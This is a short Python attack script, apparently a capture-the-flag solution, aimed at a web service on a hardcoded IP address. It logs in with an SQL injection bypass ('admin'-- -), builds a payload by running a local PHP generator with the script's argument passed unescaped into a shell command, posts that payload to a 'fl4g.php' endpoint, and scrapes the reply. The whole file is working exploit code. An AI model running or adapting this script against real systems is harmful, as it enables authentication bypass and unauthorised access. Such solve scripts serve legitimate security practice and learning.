import requests
import os
import sys
import re

url = "http://143.198.200.16:50621/"

s = requests.Session()

r = s.post(url + "logins.php", data={
    "username": "admin'-- -",
    "passw0rd": "admin",
    "submit": ""
})

payload = os.popen(f"php generate.php '{sys.argv[1]}'").read()

r = s.post(url + "fl4g.php", data={
    "r": payload
})

pattern = r"Admin is logged in\.(.*?)<code>"
match = re.search(pattern, r.text, re.DOTALL)

if match:
    extracted_value = match.group(1)
    print(extracted_value)
else:
    print("Not found")